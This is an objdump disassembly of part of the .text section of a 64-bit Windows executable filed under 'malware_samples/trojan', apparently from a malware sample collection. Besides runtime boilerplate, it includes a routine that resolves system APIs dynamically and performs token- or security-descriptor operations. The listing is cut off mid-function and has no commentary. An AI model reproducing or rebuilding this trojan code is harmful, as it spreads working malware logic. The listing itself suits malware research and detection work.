
malware_samples/trojan/bf7120a63483a2e4300a4d1405ac7525f11dd1f6d6a7120767bc42566da35891.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 8d 0d e9 6c 01 00 	lea    0x16ce9(%rip),%rcx        # 0x180017cf0
   180001007:	e9 a4 16 00 00       	jmp    0x1800026b0
   18000100c:	cc                   	int3
   18000100d:	cc                   	int3
   18000100e:	cc                   	int3
   18000100f:	cc                   	int3
   180001010:	48 8d 0d 49 6d 01 00 	lea    0x16d49(%rip),%rcx        # 0x180017d60
   180001017:	e9 94 16 00 00       	jmp    0x1800026b0
   18000101c:	cc                   	int3
   18000101d:	cc                   	int3
   18000101e:	cc                   	int3
   18000101f:	cc                   	int3
   180001020:	48 8d 0d a9 6d 01 00 	lea    0x16da9(%rip),%rcx        # 0x180017dd0
   180001027:	e9 84 16 00 00       	jmp    0x1800026b0
   18000102c:	cc                   	int3
   18000102d:	cc                   	int3
   18000102e:	cc                   	int3
   18000102f:	cc                   	int3
   180001030:	48 8d 05 19 3d 02 00 	lea    0x23d19(%rip),%rax        # 0x180024d50
   180001037:	c3                   	ret
   180001038:	cc                   	int3
   180001039:	cc                   	int3
   18000103a:	cc                   	int3
   18000103b:	cc                   	int3
   18000103c:	cc                   	int3
   18000103d:	cc                   	int3
   18000103e:	cc                   	int3
   18000103f:	cc                   	int3
   180001040:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   180001045:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000104a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000104f:	53                   	push   %rbx
   180001050:	56                   	push   %rsi
   180001051:	57                   	push   %rdi
   180001052:	48 83 ec 30          	sub    $0x30,%rsp
   180001056:	48 8b fa             	mov    %rdx,%rdi
   180001059:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   18000105e:	48 8b d9             	mov    %rcx,%rbx
   180001061:	e8 ca ff ff ff       	call   0x180001030
   180001066:	45 33 c9             	xor    %r9d,%r9d
   180001069:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000106e:	4c 8b c7             	mov    %rdi,%r8
   180001071:	48 8b d3             	mov    %rbx,%rdx
   180001074:	48 8b 08             	mov    (%rax),%rcx
   180001077:	e8 d4 96 00 00       	call   0x18000a750
   18000107c:	48 83 c4 30          	add    $0x30,%rsp
   180001080:	5f                   	pop    %rdi
   180001081:	5e                   	pop    %rsi
   180001082:	5b                   	pop    %rbx
   180001083:	c3                   	ret
   180001084:	cc                   	int3
   180001085:	cc                   	int3
   180001086:	cc                   	int3
   180001087:	cc                   	int3
   180001088:	cc                   	int3
   180001089:	cc                   	int3
   18000108a:	cc                   	int3
   18000108b:	cc                   	int3
   18000108c:	cc                   	int3
   18000108d:	cc                   	int3
   18000108e:	cc                   	int3
   18000108f:	cc                   	int3
   180001090:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180001095:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000109a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000109f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800010a4:	53                   	push   %rbx
   1800010a5:	56                   	push   %rsi
   1800010a6:	57                   	push   %rdi
   1800010a7:	48 83 ec 30          	sub    $0x30,%rsp
   1800010ab:	48 8b f9             	mov    %rcx,%rdi
   1800010ae:	48 8d 74 24 58       	lea    0x58(%rsp),%rsi
   1800010b3:	b9 01 00 00 00       	mov    $0x1,%ecx
   1800010b8:	e8 3b 4f 00 00       	call   0x180005ff8
   1800010bd:	48 8b d8             	mov    %rax,%rbx
   1800010c0:	e8 6b ff ff ff       	call   0x180001030
   1800010c5:	45 33 c9             	xor    %r9d,%r9d
   1800010c8:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800010cd:	4c 8b c7             	mov    %rdi,%r8
   1800010d0:	48 8b d3             	mov    %rbx,%rdx
   1800010d3:	48 8b 08             	mov    (%rax),%rcx
   1800010d6:	e8 75 96 00 00       	call   0x18000a750
   1800010db:	48 83 c4 30          	add    $0x30,%rsp
   1800010df:	5f                   	pop    %rdi
   1800010e0:	5e                   	pop    %rsi
   1800010e1:	5b                   	pop    %rbx
   1800010e2:	c3                   	ret
   1800010e3:	cc                   	int3
   1800010e4:	cc                   	int3
   1800010e5:	cc                   	int3
   1800010e6:	cc                   	int3
   1800010e7:	cc                   	int3
   1800010e8:	cc                   	int3
   1800010e9:	cc                   	int3
   1800010ea:	cc                   	int3
   1800010eb:	cc                   	int3
   1800010ec:	cc                   	int3
   1800010ed:	cc                   	int3
   1800010ee:	cc                   	int3
   1800010ef:	cc                   	int3
   1800010f0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800010f5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800010fa:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800010ff:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180001104:	53                   	push   %rbx
   180001105:	56                   	push   %rsi
   180001106:	57                   	push   %rdi
   180001107:	48 83 ec 30          	sub    $0x30,%rsp
   18000110b:	48 8b f9             	mov    %rcx,%rdi
   18000110e:	48 8d 74 24 58       	lea    0x58(%rsp),%rsi
   180001113:	b9 01 00 00 00       	mov    $0x1,%ecx
   180001118:	e8 db 4e 00 00       	call   0x180005ff8
   18000111d:	48 8b d8             	mov    %rax,%rbx
   180001120:	e8 0b ff ff ff       	call   0x180001030
   180001125:	45 33 c9             	xor    %r9d,%r9d
   180001128:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000112d:	4c 8b c7             	mov    %rdi,%r8
   180001130:	48 8b d3             	mov    %rbx,%rdx
   180001133:	48 8b 08             	mov    (%rax),%rcx
   180001136:	e8 f1 94 00 00       	call   0x18000a62c
   18000113b:	48 83 c4 30          	add    $0x30,%rsp
   18000113f:	5f                   	pop    %rdi
   180001140:	5e                   	pop    %rsi
   180001141:	5b                   	pop    %rbx
   180001142:	c3                   	ret
   180001143:	cc                   	int3
   180001144:	cc                   	int3
   180001145:	cc                   	int3
   180001146:	cc                   	int3
   180001147:	cc                   	int3
   180001148:	cc                   	int3
   180001149:	cc                   	int3
   18000114a:	cc                   	int3
   18000114b:	cc                   	int3
   18000114c:	cc                   	int3
   18000114d:	cc                   	int3
   18000114e:	cc                   	int3
   18000114f:	cc                   	int3
   180001150:	40 53                	rex push %rbx
   180001152:	48 83 ec 20          	sub    $0x20,%rsp
   180001156:	48 8b d9             	mov    %rcx,%rbx
   180001159:	48 8b c2             	mov    %rdx,%rax
   18000115c:	48 8d 0d f5 71 01 00 	lea    0x171f5(%rip),%rcx        # 0x180018358
   180001163:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001166:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000116a:	48 89 0b             	mov    %rcx,(%rbx)
   18000116d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001171:	0f 11 02             	movups %xmm0,(%rdx)
   180001174:	e8 df 25 00 00       	call   0x180003758
   180001179:	48 8b c3             	mov    %rbx,%rax
   18000117c:	48 83 c4 20          	add    $0x20,%rsp
   180001180:	5b                   	pop    %rbx
   180001181:	c3                   	ret
   180001182:	cc                   	int3
   180001183:	cc                   	int3
   180001184:	cc                   	int3
   180001185:	cc                   	int3
   180001186:	cc                   	int3
   180001187:	cc                   	int3
   180001188:	cc                   	int3
   180001189:	cc                   	int3
   18000118a:	cc                   	int3
   18000118b:	cc                   	int3
   18000118c:	cc                   	int3
   18000118d:	cc                   	int3
   18000118e:	cc                   	int3
   18000118f:	cc                   	int3
   180001190:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   180001194:	48 8d 05 95 f2 01 00 	lea    0x1f295(%rip),%rax        # 0x180020430
   18000119b:	48 85 d2             	test   %rdx,%rdx
   18000119e:	48 0f 45 c2          	cmovne %rdx,%rax
   1800011a2:	c3                   	ret
   1800011a3:	cc                   	int3
   1800011a4:	cc                   	int3
   1800011a5:	cc                   	int3
   1800011a6:	cc                   	int3
   1800011a7:	cc                   	int3
   1800011a8:	cc                   	int3
   1800011a9:	cc                   	int3
   1800011aa:	cc                   	int3
   1800011ab:	cc                   	int3
   1800011ac:	cc                   	int3
   1800011ad:	cc                   	int3
   1800011ae:	cc                   	int3
   1800011af:	cc                   	int3
   1800011b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800011b5:	57                   	push   %rdi
   1800011b6:	48 83 ec 20          	sub    $0x20,%rsp
   1800011ba:	48 8d 05 97 71 01 00 	lea    0x17197(%rip),%rax        # 0x180018358
   1800011c1:	48 8b f9             	mov    %rcx,%rdi
   1800011c4:	48 89 01             	mov    %rax,(%rcx)
   1800011c7:	8b da                	mov    %edx,%ebx
   1800011c9:	48 83 c1 08          	add    $0x8,%rcx
   1800011cd:	e8 16 26 00 00       	call   0x1800037e8
   1800011d2:	f6 c3 01             	test   $0x1,%bl
   1800011d5:	74 0d                	je     0x1800011e4
   1800011d7:	ba 18 00 00 00       	mov    $0x18,%edx
   1800011dc:	48 8b cf             	mov    %rdi,%rcx
   1800011df:	e8 20 11 00 00       	call   0x180002304
   1800011e4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800011e9:	48 8b c7             	mov    %rdi,%rax
   1800011ec:	48 83 c4 20          	add    $0x20,%rsp
   1800011f0:	5f                   	pop    %rdi
   1800011f1:	c3                   	ret
   1800011f2:	cc                   	int3
   1800011f3:	cc                   	int3
   1800011f4:	cc                   	int3
   1800011f5:	cc                   	int3
   1800011f6:	cc                   	int3
   1800011f7:	cc                   	int3
   1800011f8:	cc                   	int3
   1800011f9:	cc                   	int3
   1800011fa:	cc                   	int3
   1800011fb:	cc                   	int3
   1800011fc:	cc                   	int3
   1800011fd:	cc                   	int3
   1800011fe:	cc                   	int3
   1800011ff:	cc                   	int3
   180001200:	48 8d 05 51 71 01 00 	lea    0x17151(%rip),%rax        # 0x180018358
   180001207:	48 89 01             	mov    %rax,(%rcx)
   18000120a:	48 83 c1 08          	add    $0x8,%rcx
   18000120e:	e9 d5 25 00 00       	jmp    0x1800037e8
   180001213:	cc                   	int3
   180001214:	cc                   	int3
   180001215:	cc                   	int3
   180001216:	cc                   	int3
   180001217:	cc                   	int3
   180001218:	cc                   	int3
   180001219:	cc                   	int3
   18000121a:	cc                   	int3
   18000121b:	cc                   	int3
   18000121c:	cc                   	int3
   18000121d:	cc                   	int3
   18000121e:	cc                   	int3
   18000121f:	cc                   	int3
   180001220:	48 8d 05 21 f2 01 00 	lea    0x1f221(%rip),%rax        # 0x180020448
   180001227:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   18000122e:	00 
   18000122f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180001233:	48 8d 05 c6 71 01 00 	lea    0x171c6(%rip),%rax        # 0x180018400
   18000123a:	48 89 01             	mov    %rax,(%rcx)
   18000123d:	48 8b c1             	mov    %rcx,%rax
   180001240:	c3                   	ret
   180001241:	cc                   	int3
   180001242:	cc                   	int3
   180001243:	cc                   	int3
   180001244:	cc                   	int3
   180001245:	cc                   	int3
   180001246:	cc                   	int3
   180001247:	cc                   	int3
   180001248:	cc                   	int3
   180001249:	cc                   	int3
   18000124a:	cc                   	int3
   18000124b:	cc                   	int3
   18000124c:	cc                   	int3
   18000124d:	cc                   	int3
   18000124e:	cc                   	int3
   18000124f:	cc                   	int3
   180001250:	48 83 ec 48          	sub    $0x48,%rsp
   180001254:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180001259:	e8 c2 ff ff ff       	call   0x180001220
   18000125e:	48 8d 15 1b 11 02 00 	lea    0x2111b(%rip),%rdx        # 0x180022380
   180001265:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000126a:	e8 dd 26 00 00       	call   0x18000394c
   18000126f:	cc                   	int3
   180001270:	40 53                	rex push %rbx
   180001272:	48 83 ec 20          	sub    $0x20,%rsp
   180001276:	48 8b d9             	mov    %rcx,%rbx
   180001279:	48 8b c2             	mov    %rdx,%rax
   18000127c:	48 8d 0d d5 70 01 00 	lea    0x170d5(%rip),%rcx        # 0x180018358
   180001283:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001286:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000128a:	48 89 0b             	mov    %rcx,(%rbx)
   18000128d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001291:	0f 11 02             	movups %xmm0,(%rdx)
   180001294:	e8 bf 24 00 00       	call   0x180003758
   180001299:	48 8d 05 60 71 01 00 	lea    0x17160(%rip),%rax        # 0x180018400
   1800012a0:	48 89 03             	mov    %rax,(%rbx)
   1800012a3:	48 8b c3             	mov    %rbx,%rax
   1800012a6:	48 83 c4 20          	add    $0x20,%rsp
   1800012aa:	5b                   	pop    %rbx
   1800012ab:	c3                   	ret
   1800012ac:	cc                   	int3
   1800012ad:	cc                   	int3
   1800012ae:	cc                   	int3
   1800012af:	cc                   	int3
   1800012b0:	40 53                	rex push %rbx
   1800012b2:	48 83 ec 20          	sub    $0x20,%rsp
   1800012b6:	48 8b d9             	mov    %rcx,%rbx
   1800012b9:	48 8b c2             	mov    %rdx,%rax
   1800012bc:	48 8d 0d 95 70 01 00 	lea    0x17095(%rip),%rcx        # 0x180018358
   1800012c3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800012c6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800012ca:	48 89 0b             	mov    %rcx,(%rbx)
   1800012cd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800012d1:	0f 11 02             	movups %xmm0,(%rdx)
   1800012d4:	e8 7f 24 00 00       	call   0x180003758
   1800012d9:	48 8d 05 90 70 01 00 	lea    0x17090(%rip),%rax        # 0x180018370
   1800012e0:	48 89 03             	mov    %rax,(%rbx)
   1800012e3:	48 8b c3             	mov    %rbx,%rax
   1800012e6:	48 83 c4 20          	add    $0x20,%rsp
   1800012ea:	5b                   	pop    %rbx
   1800012eb:	c3                   	ret
   1800012ec:	cc                   	int3
   1800012ed:	cc                   	int3
   1800012ee:	cc                   	int3
   1800012ef:	cc                   	int3
   1800012f0:	48 83 ec 28          	sub    $0x28,%rsp
   1800012f4:	48 8d 0d 65 f1 01 00 	lea    0x1f165(%rip),%rcx        # 0x180020460
   1800012fb:	e8 a4 0f 00 00       	call   0x1800022a4
   180001300:	cc                   	int3
   180001301:	cc                   	int3
   180001302:	cc                   	int3
   180001303:	cc                   	int3
   180001304:	cc                   	int3
   180001305:	cc                   	int3
   180001306:	cc                   	int3
   180001307:	cc                   	int3
   180001308:	cc                   	int3
   180001309:	cc                   	int3
   18000130a:	cc                   	int3
   18000130b:	cc                   	int3
   18000130c:	cc                   	int3
   18000130d:	cc                   	int3
   18000130e:	cc                   	int3
   18000130f:	cc                   	int3
   180001310:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001315:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000131a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000131f:	57                   	push   %rdi
   180001320:	41 56                	push   %r14
   180001322:	41 57                	push   %r15
   180001324:	48 83 ec 40          	sub    $0x40,%rsp
   180001328:	48 83 3d 38 27 02 00 	cmpq   $0x10,0x22738(%rip)        # 0x180023a68
   18000132f:	10 
   180001330:	48 8d 35 19 27 02 00 	lea    0x22719(%rip),%rsi        # 0x180023a50
   180001337:	4c 8b f1             	mov    %rcx,%r14
   18000133a:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   18000133f:	4c 8b c6             	mov    %rsi,%r8
   180001342:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   180001349:	4c 0f 43 05 ff 26 02 	cmovae 0x226ff(%rip),%r8        # 0x180023a50
   180001350:	00 
   180001351:	44 8b cb             	mov    %ebx,%r9d
   180001354:	45 33 ff             	xor    %r15d,%r15d
   180001357:	33 d2                	xor    %edx,%edx
   180001359:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   18000135e:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   180001363:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   180001368:	ff 15 ca 6c 01 00    	call   *0x16cca(%rip)        # 0x180018038
   18000136e:	48 63 f8             	movslq %eax,%rdi
   180001371:	b8 02 00 00 00       	mov    $0x2,%eax
   180001376:	48 f7 e7             	mul    %rdi
   180001379:	48 0f 40 c3          	cmovo  %rbx,%rax
   18000137d:	48 8b c8             	mov    %rax,%rcx
   180001380:	e8 43 13 00 00       	call   0x1800026c8
   180001385:	48 83 3d db 26 02 00 	cmpq   $0x10,0x226db(%rip)        # 0x180023a68
   18000138c:	10 
   18000138d:	44 8b cb             	mov    %ebx,%r9d
   180001390:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   180001394:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   180001399:	48 0f 43 35 af 26 02 	cmovae 0x226af(%rip),%rsi        # 0x180023a50
   1800013a0:	00 
   1800013a1:	48 8b e8             	mov    %rax,%rbp
   1800013a4:	4c 8b c6             	mov    %rsi,%r8
   1800013a7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800013ac:	33 d2                	xor    %edx,%edx
   1800013ae:	ff 15 84 6c 01 00    	call   *0x16c84(%rip)        # 0x180018038
   1800013b4:	4d 89 7e 10          	mov    %r15,0x10(%r14)
   1800013b8:	49 c7 46 18 07 00 00 	movq   $0x7,0x18(%r14)
   1800013bf:	00 
   1800013c0:	66 45 89 3e          	mov    %r15w,(%r14)
   1800013c4:	48 ff c3             	inc    %rbx
   1800013c7:	66 44 39 7c 5d 00    	cmp    %r15w,0x0(%rbp,%rbx,2)
   1800013cd:	75 f5                	jne    0x1800013c4
   1800013cf:	4c 8b c3             	mov    %rbx,%r8
   1800013d2:	48 8b d5             	mov    %rbp,%rdx
   1800013d5:	49 8b ce             	mov    %r14,%rcx
   1800013d8:	e8 13 06 00 00       	call   0x1800019f0
   1800013dd:	48 8b cd             	mov    %rbp,%rcx
   1800013e0:	e8 1f 0f 00 00       	call   0x180002304
   1800013e5:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1800013ea:	49 8b c6             	mov    %r14,%rax
   1800013ed:	48 8b 6c 24 70       	mov    0x70(%rsp),%rbp
   1800013f2:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1800013f7:	48 83 c4 40          	add    $0x40,%rsp
   1800013fb:	41 5f                	pop    %r15
   1800013fd:	41 5e                	pop    %r14
   1800013ff:	5f                   	pop    %rdi
   180001400:	c3                   	ret
   180001401:	cc                   	int3
   180001402:	cc                   	int3
   180001403:	cc                   	int3
   180001404:	cc                   	int3
   180001405:	cc                   	int3
   180001406:	cc                   	int3
   180001407:	cc                   	int3
   180001408:	cc                   	int3
   180001409:	cc                   	int3
   18000140a:	cc                   	int3
   18000140b:	cc                   	int3
   18000140c:	cc                   	int3
   18000140d:	cc                   	int3
   18000140e:	cc                   	int3
   18000140f:	cc                   	int3
   180001410:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180001415:	55                   	push   %rbp
   180001416:	56                   	push   %rsi
   180001417:	57                   	push   %rdi
   180001418:	41 54                	push   %r12
   18000141a:	41 55                	push   %r13
   18000141c:	41 56                	push   %r14
   18000141e:	41 57                	push   %r15
   180001420:	48 8d ac 24 e0 fe ff 	lea    -0x120(%rsp),%rbp
   180001427:	ff 
   180001428:	48 81 ec 20 02 00 00 	sub    $0x220,%rsp
   18000142f:	48 8b 05 da 1b 02 00 	mov    0x21bda(%rip),%rax        # 0x180023010
   180001436:	48 33 c4             	xor    %rsp,%rax
   180001439:	48 89 85 10 01 00 00 	mov    %rax,0x110(%rbp)
   180001440:	33 c0                	xor    %eax,%eax
   180001442:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180001447:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000144a:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   18000144f:	4c 8b e2             	mov    %rdx,%r12
   180001452:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180001457:	33 d2                	xor    %edx,%edx
   180001459:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   18000145e:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   180001462:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180001467:	41 b8 40 01 00 00    	mov    $0x140,%r8d
   18000146d:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180001472:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   180001476:	0f 11 45 b0          	movups %xmm0,-0x50(%rbp)
   18000147a:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   18000147e:	e8 2d 28 00 00       	call   0x180003cb0
   180001483:	48 8d 0d e6 ef 01 00 	lea    0x1efe6(%rip),%rcx        # 0x180020470
   18000148a:	ff 15 a0 6b 01 00    	call   *0x16ba0(%rip)        # 0x180018030
   180001490:	48 8d 0d e5 ef 01 00 	lea    0x1efe5(%rip),%rcx        # 0x18002047c
   180001497:	48 8b d8             	mov    %rax,%rbx
   18000149a:	ff 15 90 6b 01 00    	call   *0x16b90(%rip)        # 0x180018030
   1800014a0:	48 8d 15 e1 ef 01 00 	lea    0x1efe1(%rip),%rdx        # 0x180020488
   1800014a7:	48 8b cb             	mov    %rbx,%rcx
   1800014aa:	48 8b f8             	mov    %rax,%rdi
   1800014ad:	ff 15 75 6b 01 00    	call   *0x16b75(%rip)        # 0x180018028
   1800014b3:	48 8d 15 de ef 01 00 	lea    0x1efde(%rip),%rdx        # 0x180020498
   1800014ba:	48 8b cb             	mov    %rbx,%rcx
   1800014bd:	48 8b f0             	mov    %rax,%rsi
   1800014c0:	ff 15 62 6b 01 00    	call   *0x16b62(%rip)        # 0x180018028
   1800014c6:	48 8d 15 db ef 01 00 	lea    0x1efdb(%rip),%rdx        # 0x1800204a8
   1800014cd:	48 8b cb             	mov    %rbx,%rcx
   1800014d0:	4c 8b f0             	mov    %rax,%r14
   1800014d3:	ff 15 4f 6b 01 00    	call   *0x16b4f(%rip)        # 0x180018028
   1800014d9:	48 8d 15 e0 ef 01 00 	lea    0x1efe0(%rip),%rdx        # 0x1800204c0
   1800014e0:	48 8b cb             	mov    %rbx,%rcx
   1800014e3:	4c 8b f8             	mov    %rax,%r15
   1800014e6:	ff 15 3c 6b 01 00    	call   *0x16b3c(%rip)        # 0x180018028
   1800014ec:	48 8d 15 e5 ef 01 00 	lea    0x1efe5(%rip),%rdx        # 0x1800204d8
   1800014f3:	48 8b cb             	mov    %rbx,%rcx
   1800014f6:	4c 8b e8             	mov    %rax,%r13
   1800014f9:	ff 15 29 6b 01 00    	call   *0x16b29(%rip)        # 0x180018028
   1800014ff:	48 8d 15 ea ef 01 00 	lea    0x1efea(%rip),%rdx        # 0x1800204f0
   180001506:	48 8b cf             	mov    %rdi,%rcx
   180001509:	ff 15 19 6b 01 00    	call   *0x16b19(%rip)        # 0x180018028
   18000150f:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   180001514:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   180001518:	48 8b d8             	mov    %rax,%rbx
   18000151b:	48 8b d7             	mov    %rdi,%rdx
   18000151e:	ff d3                	call   *%rbx
   180001520:	49 8b d4             	mov    %r12,%rdx
   180001523:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   180001528:	ff d3                	call   *%rbx
   18000152a:	45 33 c9             	xor    %r9d,%r9d
   18000152d:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   180001532:	33 c9                	xor    %ecx,%ecx
   180001534:	45 8d 41 21          	lea    0x21(%r9),%r8d
   180001538:	ff d6                	call   *%rsi
   18000153a:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   18000153f:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180001545:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   180001549:	33 c9                	xor    %ecx,%ecx
   18000154b:	ff 15 b7 6a 01 00    	call   *0x16ab7(%rip)        # 0x180018008
   180001551:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   180001556:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   18000155b:	ba 05 00 00 00       	mov    $0x5,%edx
   180001560:	ff 15 9a 6a 01 00    	call   *0x16a9a(%rip)        # 0x180018000
   180001566:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
   18000156b:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   180001570:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180001575:	ba 11 02 00 00       	mov    $0x211,%edx
   18000157a:	4d 8b 40 10          	mov    0x10(%r8),%r8
   18000157e:	41 ff d6             	call   *%r14
   180001581:	48 8d 45 88          	lea    -0x78(%rbp),%rax
   180001585:	41 b9 ff 07 0f 00    	mov    $0xf07ff,%r9d
   18000158b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180001590:	48 8d 55 90          	lea    -0x70(%rbp),%rdx
   180001594:	48 8d 45 8c          	lea    -0x74(%rbp),%rax
   180001598:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   18000159e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800015a3:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
   1800015a8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800015ad:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1800015b2:	41 ff d7             	call   *%r15
   1800015b5:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
   1800015b9:	48 8d 8d b0 00 00 00 	lea    0xb0(%rbp),%rcx
   1800015c0:	ff d3                	call   *%rbx
   1800015c2:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   1800015c7:	4c 8d 45 d0          	lea    -0x30(%rbp),%r8
   1800015cb:	81 8d ec 00 00 00 00 	orl    $0x1000000,0xec(%rbp)
   1800015d2:	00 00 01 
   1800015d5:	ba 15 00 00 00       	mov    $0x15,%edx
   1800015da:	c6 85 09 01 00 00 01 	movb   $0x1,0x109(%rbp)
   1800015e1:	41 ff d5             	call   *%r13
   1800015e4:	85 c0                	test   %eax,%eax
   1800015e6:	75 1d                	jne    0x180001605
   1800015e8:	48 8b 15 51 37 02 00 	mov    0x23751(%rip),%rdx        # 0x180024d40
   1800015ef:	48 8d 0d 1a ef 01 00 	lea    0x1ef1a(%rip),%rcx        # 0x180020510
   1800015f6:	4c 8b 42 10          	mov    0x10(%rdx),%r8
   1800015fa:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   1800015fe:	e8 8d fa ff ff       	call   0x180001090
   180001603:	eb 0c                	jmp    0x180001611
   180001605:	48 8d 0d 54 ef 01 00 	lea    0x1ef54(%rip),%rcx        # 0x180020560
   18000160c:	e8 7f fa ff ff       	call   0x180001090
   180001611:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   180001616:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   18000161b:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   180001621:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   180001628:	00 
   180001629:	48 8d 15 70 ef 01 00 	lea    0x1ef70(%rip),%rdx        # 0x1800205a0
   180001630:	33 c9                	xor    %ecx,%ecx
   180001632:	ff 15 40 6c 01 00    	call   *0x16c40(%rip)        # 0x180018278
   180001638:	85 c0                	test   %eax,%eax
   18000163a:	74 0e                	je     0x18000164a
   18000163c:	48 8d 0d cd ef 01 00 	lea    0x1efcd(%rip),%rcx        # 0x180020610
   180001643:	3d 62 05 00 00       	cmp    $0x562,%eax
   180001648:	75 07                	jne    0x180001651
   18000164a:	48 8d 0d 6f ef 01 00 	lea    0x1ef6f(%rip),%rcx        # 0x1800205c0
   180001651:	e8 3a fa ff ff       	call   0x180001090
   180001656:	48 8b 8d 10 01 00 00 	mov    0x110(%rbp),%rcx
   18000165d:	48 33 cc             	xor    %rsp,%rcx
   180001660:	e8 7b 0c 00 00       	call   0x1800022e0
   180001665:	48 8b 9c 24 70 02 00 	mov    0x270(%rsp),%rbx
   18000166c:	00 
   18000166d:	48 81 c4 20 02 00 00 	add    $0x220,%rsp
   180001674:	41 5f                	pop    %r15
   180001676:	41 5e                	pop    %r14
   180001678:	41 5d                	pop    %r13
   18000167a:	41 5c                	pop    %r12
   18000167c:	5f                   	pop    %rdi
   18000167d:	5e                   	pop    %rsi
   18000167e:	5d                   	pop    %rbp
   18000167f:	c3                   	ret
   180001680:	40 53                	rex push %rbx
   180001682:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   180001689:	48 8b 05 80 19 02 00 	mov    0x21980(%rip),%rax        # 0x180023010
   180001690:	48 33 c4             	xor    %rsp,%rax
   180001693:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   180001698:	48 8b d9             	mov    %rcx,%rbx
   18000169b:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   1800016a0:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   1800016a5:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   1800016aa:	ba 01 00 00 00       	mov    $0x1,%edx
   1800016af:	c7 44 24 70 00 00 00 	movl   $0x0,0x70(%rsp)
   1800016b6:	00 
   1800016b7:	33 c9                	xor    %ecx,%ecx
   1800016b9:	c7 44 24 4c 01 00 00 	movl   $0x1,0x4c(%rsp)
   1800016c0:	00 
   1800016c1:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   1800016c6:	c7 44 24 60 01 00 00 	movl   $0x1,0x60(%rsp)
   1800016cd:	00 
